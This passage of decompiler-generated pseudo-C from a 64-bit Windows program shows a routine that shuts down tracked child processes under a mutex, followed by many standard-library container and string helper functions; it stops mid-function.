// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (000000014001B530) ----------------------------------------------------
char __fastcall sub_14001B530(__int64 a1, unsigned int *a2)
{
  unsigned int *v2; // rbx
  __int64 v3; // r13
  void *v4; // rax
  int v5; // eax
  unsigned int v6; // er8
  __int64 v7; // rax
  __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 *v10; // rbx
  __int64 v11; // rbx
  signed __int64 v12; // rsi
  __int64 *v13; // rdi
  __int64 *v14; // rbx
  __int64 **v15; // rax
  __int64 *j; // rax
  __int64 *i; // rax
  _QWORD *v18; // rdi
  _QWORD *k; // rbx
  bool v20; // si
  int v21; // eax
  _QWORD *v22; // rax
  __int64 v23; // rdi
  __int64 *v24; // rax
  __int64 v25; // rdx
  volatile signed __int32 *v26; // rbx
  _DWORD *v27; // rax
  volatile signed __int32 *v28; // rbx
  char v29; // r12
  __int64 *v30; // rdi
  __int64 *v31; // rbx
  DWORD v32; // eax
  __int64 v33; // rsi
  size_t v34; // r8
  size_t v35; // r8
  void **v36; // rsi
  _QWORD *v37; // rax
  __int64 **v38; // rax
  __int64 *m; // rax
  __int64 *l; // rax
  volatile signed __int32 *v41; // rbx
  _QWORD *v42; // rax
  void **v43; // rdi
  void **v44; // rbx
  char v46; // [rsp+20h] [rbp-258h]
  bool v47; // [rsp+30h] [rbp-248h]
  void *v48; // [rsp+38h] [rbp-240h]
  __int64 v49; // [rsp+40h] [rbp-238h]
  __int64 v50; // [rsp+48h] [rbp-230h]
  volatile signed __int32 *v51; // [rsp+50h] [rbp-228h]
  volatile signed __int32 *v52; // [rsp+58h] [rbp-220h]
  __int64 v53; // [rsp+60h] [rbp-218h]
  __int64 v54; // [rsp+68h] [rbp-210h]
  __int64 v55; // [rsp+70h] [rbp-208h]
  volatile signed __int32 *v56; // [rsp+78h] [rbp-200h]
  int v57; // [rsp+80h] [rbp-1F8h]
  __int64 v58; // [rsp+88h] [rbp-1F0h]
  int v59; // [rsp+90h] [rbp-1E8h]
  __int64 v60; // [rsp+98h] [rbp-1E0h]
  __time64_t v61; // [rsp+A0h] [rbp-1D8h]
  __int64 v62; // [rsp+A8h] [rbp-1D0h]
  __int64 v63; // [rsp+B0h] [rbp-1C8h]
  char v64; // [rsp+B8h] [rbp-1C0h]
  char v65; // [rsp+C0h] [rbp-1B8h]
  char v66; // [rsp+C8h] [rbp-1B0h]
  char v67; // [rsp+D8h] [rbp-1A0h]
  void *Dst; // [rsp+F0h] [rbp-188h]
  __int64 v69; // [rsp+100h] [rbp-178h]
  unsigned __int64 v70; // [rsp+108h] [rbp-170h]
  void *v71; // [rsp+110h] [rbp-168h]
  __int64 v72; // [rsp+120h] [rbp-158h]
  unsigned __int64 v73; // [rsp+128h] [rbp-150h]
  void *v74; // [rsp+130h] [rbp-148h]
  __int64 v75; // [rsp+140h] [rbp-138h]
  unsigned __int64 v76; // [rsp+148h] [rbp-130h]
  void *Src; // [rsp+150h] [rbp-128h]
  __int64 v78; // [rsp+160h] [rbp-118h]
  unsigned __int64 v79; // [rsp+168h] [rbp-110h]
  void *v80; // [rsp+170h] [rbp-108h]
  unsigned __int64 v81; // [rsp+188h] [rbp-F0h]
  void *v82; // [rsp+190h] [rbp-E8h]
  unsigned __int64 v83; // [rsp+1A8h] [rbp-D0h]
  char v84; // [rsp+1B0h] [rbp-C8h]

  v62 = -2i64;
  v2 = a2;
  v3 = a1;
  v49 = 0i64;
  sub_14001BCC0();
  v48 = v4;
  v63 = v3;
  v5 = Mtx_lock(v3);
  if ( v5 )
    std::_Throw_C_error(v5);
  v64 = 1;
  v6 = *v2;
  if ( *v2 )
  {
    v7 = *(_QWORD *)(v3 + 8);
    v8 = *(_QWORD *)(v7 + 8);
    v9 = *(_QWORD *)(v3 + 8);
    while ( !*(_BYTE *)(v8 + 25) )
    {
      if ( *(_DWORD *)(v8 + 32) >= v6 )
      {
        v9 = v8;
        v8 = *(_QWORD *)v8;
      }
      else
      {
        v8 = *(_QWORD *)(v8 + 16);
      }
    }
    if ( v9 == v7 || v6 < *(_DWORD *)(v9 + 32) )
    {
      v54 = *(_QWORD *)(v3 + 8);
      v10 = &v54;
    }
    else
    {
      v53 = v9;
      v10 = &v53;
    }
    v11 = *v10;
    if ( v11 != v7 )
    {
      v46 = byte_1400D9E46;
      sub_1400169D0(&v48, (__int64)&v67, 0, (unsigned __int64 *)(v11 + 40));
      sub_140079470((_QWORD *)(v3 + 8), (__int64 *)&v65, v11);
    }
  }
  else
  {
    v12 = v3 + 8;
    v13 = *(__int64 **)(v3 + 8);
    v14 = (__int64 *)*v13;
    while ( v14 != v13 )
    {
      v57 = *((_DWORD *)v14 + 8);
      v58 = v14[5];
      v46 = byte_1400D9E46;
      sub_1400169D0(&v48, (__int64)&v66, 0, (unsigned __int64 *)&v58);
      if ( !*((_BYTE *)v14 + 25) )
      {
        v15 = (__int64 **)v14[2];
        if ( *((_BYTE *)v15 + 25) )
        {
          for ( i = (__int64 *)v14[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
          {
            if ( v14 != (__int64 *)i[2] )
              break;
            v14 = i;
          }
          v14 = i;
        }
        else
        {
          v14 = (__int64 *)v14[2];
          for ( j = *v15; !*((_BYTE *)j + 25); j = (__int64 *)*j )
            v14 = j;
        }
      }
    }
    v18 = *(_QWORD **)(*(_QWORD *)v12 + 8i64);
    for ( k = v18; !*((_BYTE *)k + 25); v18 = k )
    {
      sub_1400792D0(v3 + 8, (void *)k[2]);
      k = (_QWORD *)*k;
      operator delete(v18);
    }
    *(_QWORD *)(*(_QWORD *)v12 + 8i64) = *(_QWORD *)v12;
    **(_QWORD **)v12 = *(_QWORD *)v12;
    *(_QWORD *)(*(_QWORD *)v12 + 16i64) = *(_QWORD *)v12;
    *(_QWORD *)(v3 + 16) = 0i64;
  }
  v20 = *(_QWORD *)(v3 + 16) == 0i64;
  v47 = *(_QWORD *)(v3 + 16) == 0i64;
  v21 = Mtx_unlock(v3);
  if ( v21 )
    std::_Throw_C_error(v21);
  if ( v20 )
    sub_140035E00((__int64 *)(v3 + 32));
  SetEvent(*(HANDLE *)(v3 + 40));
  if ( v49 )
  {
    v22 = operator new(0x10ui64);
    v23 = (__int64)v22;
    if ( v22 )
    {
      *v22 = &off_1400A2D60;
      v22[1] = &off_1400A2D48;
    }
    else
    {
      v23 = 0i64;
    }
    v50 = v23;
    v51 = 0i64;
    v24 = sub_140008610(&v52, v23);
    v25 = (__int64)v51;
    v51 = (volatile signed __int32 *)*v24;
    *v24 = v25;
    v26 = v52;
    if ( v52 )
    {
      if ( !_InterlockedDecrement(v52 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v26 + 8i64))(v26);
        if ( !_InterlockedDecrement(v26 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v26 + 16i64))(v26);
      }
    }
    sub_140008430();
    v55 = v50;
    v56 = v51;
    if ( v51 )
      _InterlockedIncrement(v51 + 2);
    v27 = sub_1400043C0(&Src);
    sub_1400780C0(&v84, v27, &v55, 0i64, v46);
    if ( v79 >= 0x10 )
      operator delete(Src);
    v79 = 15i64;
    v78 = 0i64;
    LOBYTE(Src) = 0;
    v28 = v56;
    if ( v56 )
    {
      if ( !_InterlockedDecrement(v56 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v28 + 8i64))(v28);
        if ( !_InterlockedDecrement(v28 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v28 + 16i64))(v28);
      }
    }
    v29 = sub_140078400((__int64)&v84);
    v30 = (__int64 *)v48;
    v31 = *(__int64 **)v48;
    if ( *(void **)v48 != v48 )
    {
      do
      {
        v32 = GetProcessId((HANDLE)v31[4]);
        v33 = v32;
        if ( v29 && v32 )
        {
          v61 = time64(0i64) + 10000;
          v59 = 1;
          v60 = v33;
          v70 = 15i64;
          v69 = 0i64;
          LOBYTE(Dst) = 0;
          v73 = 15i64;
          v72 = 0i64;
          LOBYTE(v71) = 0;
          v76 = 15i64;
          v75 = 0i64;
          LOBYTE(v74) = 0;
          if ( *(_BYTE *)qword_1400D9E30 )
          {
            v34 = -1i64;
            do
              ++v34;
            while ( *((_BYTE *)qword_1400D9E30 + v34) );
          }
          else
          {
            v34 = 0i64;
          }
          sub_140004F20(&Dst, qword_1400D9E30, v34);
          if ( *(_BYTE *)qword_1400D9E30 )
          {
            v35 = -1i64;
            do
              ++v35;
            while ( *((_BYTE *)qword_1400D9E30 + v35) );
          }
          else
          {
            v35 = 0i64;
          }
          sub_140004F20(&v71, qword_1400D9E30, v35);
          v36 = (void **)sub_14000AA50((__int64)&v59, (__int64)&v80);
          if ( &v74 != v36 )
          {
            if ( v76 >= 0x10 )
              operator delete(v74);
            v76 = 15i64;
            v75 = 0i64;
            LOBYTE(v74) = 0;
            sub_140004720(&v74, v36);
          }
          if ( v81 >= 0x10 )
            operator delete(v80);
          v37 = (_QWORD *)sub_14001AE70(&Dst, (__int64)&v82);
          if ( v37[3] >= 0x10ui64 )
            v37 = (_QWORD *)*v37;
          sub_140078A90(&v84, v37);
          if ( v83 >= 0x10 )
            operator delete(v82);
          if ( v76 >= 0x10 )
            operator delete(v74);
          v76 = 15i64;
          v75 = 0i64;
          LOBYTE(v74) = 0;
          if ( v73 >= 0x10 )
            operator delete(v71);
          v73 = 15i64;
          v72 = 0i64;
          LOBYTE(v71) = 0;
          if ( v70 >= 0x10 )
            operator delete(Dst);
        }
        if ( WaitForSingleObject((HANDLE)v31[4], 0xBB8u) )
          TerminateProcess((HANDLE)v31[4], 0);
        CloseHandle((HANDLE)v31[4]);
        if ( !*((_BYTE *)v31 + 25) )
        {
          v38 = (__int64 **)v31[2];
          if ( *((_BYTE *)v38 + 25) )
          {
            for ( l = (__int64 *)v31[1]; !*((_BYTE *)l + 25); l = (__int64 *)l[1] )
            {
              if ( v31 != (__int64 *)l[2] )
                break;
              v31 = l;
            }
            v31 = l;
          }
          else
          {
            v31 = (__int64 *)v31[2];
            for ( m = *v38; !*((_BYTE *)m + 25); m = (__int64 *)*m )
              v31 = m;
          }
        }
      }
      while ( v31 != v30 );
      v20 = v47;
    }
    sub_1400782B0(&v84);
    v41 = v51;
    if ( v51 )
    {
      if ( !_InterlockedDecrement(v51 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v41 + 8i64))(v41);
        if ( !_InterlockedDecrement(v41 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v41 + 16i64))(v41);
      }
    }
  }
  if ( v20 )
  {
    SetEvent(*(HANDLE *)(v3 + 40));
    sub_14001D1F0((__int64 *)(v3 + 32));
  }
  v42 = v48;
  v43 = (void **)*((_QWORD *)v48 + 1);
  v44 = v43;
  if ( !*((_BYTE *)v43 + 25) )
  {
    do
    {
      sub_1400792D0((__int64)&v48, v44[2]);
      v44 = (void **)*v44;
      operator delete(v43);
      v43 = v44;
    }
    while ( !*((_BYTE *)v44 + 25) );
    v42 = v48;
  }
  v42[1] = v42;
  *(_QWORD *)v48 = v48;
  *((_QWORD *)v48 + 2) = v48;
  v49 = 0i64;
  operator delete(v48);
  return 1;
}
// 1400780C0: using guessed type __int64 __fastcall sub_1400780C0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 140078A90: using guessed type __int64 __fastcall sub_140078A90(_QWORD, _QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);
// 1400A2D48: using guessed type __int64 (__fastcall *off_1400A2D48)();
// 1400A2D60: using guessed type __int64 (__fastcall *off_1400A2D60)();
// 1400D9E46: using guessed type char byte_1400D9E46;

//----- (000000014001BCC0) ----------------------------------------------------
void sub_14001BCC0()
{
  _QWORD *v0; // rax

  v0 = operator new(0x28ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001BD10) ----------------------------------------------------
void sub_14001BD10()
{
  _QWORD *v0; // rax

  v0 = operator new(0x30ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001BD60) ----------------------------------------------------
void sub_14001BD60()
{
  _QWORD *v0; // rax

  v0 = operator new(0x40ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001BDB0) ----------------------------------------------------
_QWORD *__fastcall sub_14001BDB0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x28ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001BE10) ----------------------------------------------------
_QWORD *__fastcall sub_14001BE10(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x30ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001BE70) ----------------------------------------------------
void __fastcall sub_14001BE70(__int64 a1, __int64 *a2, __int64 *a3)
{
  __int64 *v3; // rsi
  __int64 *v4; // rdi
  __int64 v5; // rbx
  char *v6; // rcx

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2;
    do
    {
      v5 = *v4;
      if ( *v4 && !_InterlockedDecrement((volatile signed __int32 *)(v5 + 24)) && v5 )
      {
        v6 = *(char **)(v5 + 8);
        if ( (unsigned __int64)(v6 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
          CloseHandle(v6);
        if ( (unsigned __int64)(*(_QWORD *)v5 - 1i64) <= 0xFFFFFFFFFFFFFFFDui64 )
          CloseHandle(*(HANDLE *)v5);
        operator delete((void *)v5);
      }
      ++v4;
    }
    while ( v4 != v3 );
  }
}

//----- (000000014001BF00) ----------------------------------------------------
signed __int64 __fastcall sub_14001BF00(__int64 a1, volatile signed __int32 **a2, volatile signed __int32 **a3)
{
  volatile signed __int32 **v3; // rsi
  volatile signed __int32 **v4; // rdi
  volatile signed __int32 *v5; // rbx
  signed __int64 result; // rax

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2 + 1;
    do
    {
      v5 = *v4;
      if ( *v4 && !_InterlockedDecrement(v5 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 8i64))(v5);
        if ( !_InterlockedDecrement(v5 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 16i64))(v5);
      }
      v4 += 2;
      result = (signed __int64)(v4 - 1);
    }
    while ( v4 - 1 != v3 );
  }
  return result;
}

//----- (000000014001BF70) ----------------------------------------------------
_QWORD *__fastcall sub_14001BF70(__int64 a1, __int64 a2)
{
  _QWORD *v2; // r8
  _QWORD *result; // rax

  v2 = *(_QWORD **)(a2 + 16);
  *(_QWORD *)(a2 + 16) = *v2;
  if ( !*(_BYTE *)(*v2 + 25i64) )
    *(_QWORD *)(*v2 + 8i64) = a2;
  v2[1] = *(_QWORD *)(a2 + 8);
  result = *(_QWORD **)a1;
  if ( a2 == *(_QWORD *)(*(_QWORD *)a1 + 8i64) )
  {
    result[1] = v2;
    *v2 = a2;
    *(_QWORD *)(a2 + 8) = v2;
  }
  else
  {
    result = *(_QWORD **)(a2 + 8);
    if ( a2 == *result )
      *result = v2;
    else
      result[2] = v2;
    *v2 = a2;
    *(_QWORD *)(a2 + 8) = v2;
  }
  return result;
}

//----- (000000014001BFD0) ----------------------------------------------------
char *__fastcall sub_14001BFD0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 v3; // rdi
  char *v4; // rbx
  __int64 v5; // r14
  char *result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x3FFFFFFFFFFFFFFFi64 || (v4 = (char *)operator new(4 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  memmove(v4, *(const void **)v3, 4i64 * ((*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 2));
  v5 = (*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 2;
  if ( *(_QWORD *)v3 )
    operator delete(*(void **)v3);
  *(_QWORD *)(v3 + 16) = &v4[4 * v2];
  result = &v4[4 * v5];
  *(_QWORD *)(v3 + 8) = result;
  *(_QWORD *)v3 = v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001C0A0) ----------------------------------------------------
char *__fastcall sub_14001C0A0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 v3; // rdi
  char *v4; // rbx
  __int64 v5; // r14
  char *result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x1FFFFFFFFFFFFFFFi64 || (v4 = (char *)operator new(8 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  memmove(v4, *(const void **)v3, 8i64 * ((*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 3));
  v5 = (*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 3;
  if ( *(_QWORD *)v3 )
    operator delete(*(void **)v3);
  *(_QWORD *)(v3 + 16) = &v4[8 * v2];
  result = &v4[8 * v5];
  *(_QWORD *)(v3 + 8) = result;
  *(_QWORD *)v3 = v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001C170) ----------------------------------------------------
void __fastcall sub_14001C170(void **a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  void **v3; // r14
  _QWORD *v4; // rsi
  signed __int64 v5; // rbx

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0xFFFFFFFFFFFFFFFi64 || (v4 = operator new(16 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_140016B30(*v3, v3[1], v4);
  v5 = (_BYTE *)v3[1] - (_BYTE *)*v3;
  if ( *v3 )
    operator delete(*v3);
  v3[2] = &v4[2 * v2];
  v3[1] = (char *)v4 + (v5 & 0xFFFFFFFFFFFFFFF0ui64);
  *v3 = v4;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001C230) ----------------------------------------------------
signed __int64 __fastcall sub_14001C230(__int64 **a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 **v3; // rdi
  __int64 *v4; // rbx
  signed __int64 v5; // r14
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x1FFFFFFFFFFFFFFFi64 || (v4 = (__int64 *)operator new(8 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_140016B70(*v3, v3[1], v4);
  v5 = v3[1] - *v3;
  if ( *v3 )
  {
    sub_14001BE70((__int64)v3, *v3, v3[1]);
    operator delete(*v3);
  }
  v3[2] = &v4[v2];
  result = (signed __int64)&v4[v5];
  v3[1] = (__int64 *)result;
  *v3 = v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014001C300) ----------------------------------------------------
unsigned __int64 __fastcall sub_14001C300(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  unsigned __int64 result; // rax
  signed __int64 v6; // r10
  __int64 v7; // r8
  unsigned __int64 v8; // r11
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // rdx

  v2 = a1[1];
  v3 = a2;
  v4 = a1[2];
  result = (a1[2] - v2) >> 2;
  if ( result < v3 )
  {
    v6 = 0x3FFFFFFFFFFFFFFFi64;
    v7 = (v2 - *a1) >> 2;
    if ( 0x3FFFFFFFFFFFFFFFi64 - v7 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v8 = v7 + v3;
    v9 = (v4 - *a1) >> 2;
    if ( v6 - (v9 >> 1) >= v9 )
    {
      v11 = (v9 >> 1) + v9;
      if ( v11 < v8 )
        v11 = v7 + v3;
      result = (unsigned __int64)sub_14001BFD0((__int64)a1, v11);
    }
    else
    {
      v10 = 0i64;
      if ( v8 > 0 )
        v10 = v7 + v3;
      result = (unsigned __int64)sub_14001BFD0((__int64)a1, v10);
    }
  }
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014001C390) ----------------------------------------------------
void __fastcall sub_14001C390(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  signed __int64 v5; // r10
  __int64 v6; // r8
  unsigned __int64 v7; // r11
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx

  v2 = *(_QWORD *)(a1 + 8);
  v3 = a2;
  v4 = *(_QWORD *)(a1 + 16);
  if ( (*(_QWORD *)(a1 + 16) - v2) >> 4 < v3 )
  {
    v5 = 0xFFFFFFFFFFFFFFFi64;
    v6 = (v2 - *(_QWORD *)a1) >> 4;
    if ( 0xFFFFFFFFFFFFFFFi64 - v6 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = v6 + v3;
    v8 = (v4 - *(_QWORD *)a1) >> 4;
    if ( v5 - (v8 >> 1) >= v8 )
    {
      v10 = (v8 >> 1) + v8;
      if ( v10 < v7 )
        v10 = v6 + v3;
      sub_14001C170((void **)a1, v10);
    }
    else
    {
      v9 = 0i64;
      if ( v7 > 0 )
        v9 = v6 + v3;
      sub_14001C170((void **)a1, v9);
    }
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014001C420) ----------------------------------------------------
unsigned __int64 __fastcall sub_14001C420(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  unsigned __int64 result; // rax
  signed __int64 v6; // r10
  __int64 v7; // r8
  unsigned __int64 v8; // r11
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // rdx

  v2 = *(_QWORD *)(a1 + 8);
  v3 = a2;
  v4 = *(_QWORD *)(a1 + 16);
  result = (*(_QWORD *)(a1 + 16) - v2) >> 3;
  if ( result < v3 )
  {
    v6 = 0x1FFFFFFFFFFFFFFFi64;
    v7 = (v2 - *(_QWORD *)a1) >> 3;
    if ( 0x1FFFFFFFFFFFFFFFi64 - v7 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v8 = v7 + v3;
    v9 = (v4 - *(_QWORD *)a1) >> 3;
    if ( v6 - (v9 >> 1) >= v9 )
    {
      v11 = (v9 >> 1) + v9;
      if ( v11 < v8 )
        v11 = v7 + v3;
      result = sub_14001C230((__int64 **)a1, v11);
    }
    else
    {
      v10 = 0i64;
      if ( v8 > 0 )
        v10 = v7 + v3;
      result = sub_14001C230((__int64 **)a1, v10);
    }
  }
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014001C4B0) ----------------------------------------------------
_QWORD *__fastcall sub_14001C4B0(void *Src, unsigned __int64 a2, __int16 a3)
{
  __int16 v3; // r14
  __int64 v4; // r8
  unsigned __int64 v5; // rbp
  _QWORD *v6; // rbx
  unsigned __int64 v7; // rsi
  unsigned __int64 v8; // rcx
  __int64 v9; // rcx
  _QWORD *v10; // rax
  _WORD *v11; // rdi
  unsigned __int64 i; // rcx
  bool v13; // cf
  _QWORD *v14; // rcx

  v3 = a3;
  v4 = *((_QWORD *)Src + 2);
  v5 = a2;
  v6 = Src;
  if ( -1 - v4 <= a2 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  if ( a2 )
  {
    v7 = v4 + a2;
    if ( v4 + a2 > 0x7FFFFFFFFFFFFFFEi64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v8 = *((_QWORD *)Src + 3);
    if ( v8 >= v7 )
    {
      if ( !v7 )
      {
        v6[2] = 0i64;
        if ( v8 < 8 )
          *(_WORD *)v6 = 0;
        else
          *(_WORD *)*v6 = 0;
        return v6;
      }
    }
    else
    {
      sub_1400048A0(v6, v7, v4);
      if ( !v7 )
        return v6;
    }
    v9 = v6[2];
    if ( v5 == 1 )
    {
      if ( v6[3] < 8ui64 )
        *((_WORD *)v6 + v9) = v3;
      else
        *(_WORD *)(*v6 + 2 * v9) = v3;
    }
    else
    {
      if ( v6[3] < 8ui64 )
        v10 = v6;
      else
        v10 = (_QWORD *)*v6;
      v11 = (_WORD *)((char *)v10 + 2 * v9);
      for ( i = v5; i; --i )
      {
        *v11 = v3;
        ++v11;
      }
    }
    v13 = v6[3] < 8ui64;
    v6[2] = v7;
    if ( v13 )
      v14 = v6;
    else
      v14 = (_QWORD *)*v6;
    *((_WORD *)v14 + v7) = 0;
  }
  return v6;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014001C5D4) ----------------------------------------------------
signed __int64 __fastcall sub_14001C5D4(__int64 a1)
{
  return sub_14001C5E0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001C5E0) ----------------------------------------------------
signed __int64 __fastcall sub_14001C5E0(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x58ui64);
  if ( v2 )
    v3 = sub_1400173C0(v2, (const struct std::exception *)(v1 - 80), 0i64, 1);
  else
    v3 = 0i64;
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[8] + 4i64) + 64;
  else
    result = 0i64;
  return result;
}

//----- (000000014001C644) ----------------------------------------------------
signed __int64 __fastcall sub_14001C644(__int64 a1)
{
  return sub_14001C650(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001C650) ----------------------------------------------------
signed __int64 __fastcall sub_14001C650(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x58ui64);
  if ( v2 )
    v3 = sub_1400175D0(v2, (const struct std::exception *)(v1 - 80), 0i64, 1);
  else
    v3 = 0i64;
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[8] + 4i64) + 64;
  else
    result = 0i64;
  return result;
}

//----- (000000014001C6B4) ----------------------------------------------------
signed __int64 __fastcall sub_14001C6B4(__int64 a1)
{
  return sub_14001C6C0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001C6C0) ----------------------------------------------------
signed __int64 __fastcall sub_14001C6C0(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x58ui64);
  if ( v2 )
    v3 = sub_1400177E0(v2, (const struct std::exception *)(v1 - 80), 0i64, 1);
  else
    v3 = 0i64;
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[8] + 4i64) + 64;
  else
    result = 0i64;
  return result;
}

//----- (000000014001C724) ----------------------------------------------------
signed __int64 __fastcall sub_14001C724(__int64 a1)
{
  return sub_14001C730(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001C730) ----------------------------------------------------
signed __int64 __fastcall sub_14001C730(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x58ui64);
  if ( v2 )
    v3 = sub_1400179F0(v2, v1 - 80, 0i64, 1);
  else
    v3 = 0i64;
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[8] + 4i64) + 64;
  else
    result = 0i64;
  return result;
}

//----- (000000014001C794) ----------------------------------------------------
signed __int64 __fastcall sub_14001C794(__int64 a1)
{
  return sub_14001C7A0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001C7A0) ----------------------------------------------------
signed __int64 __fastcall sub_14001C7A0(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x88ui64);
  if ( v2 )
    v3 = sub_140017C00(v2, v1 - 128, 0i64, 1);
  else
    v3 = 0i64;
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[14] + 4i64) + 112;
  else
    result = 0i64;
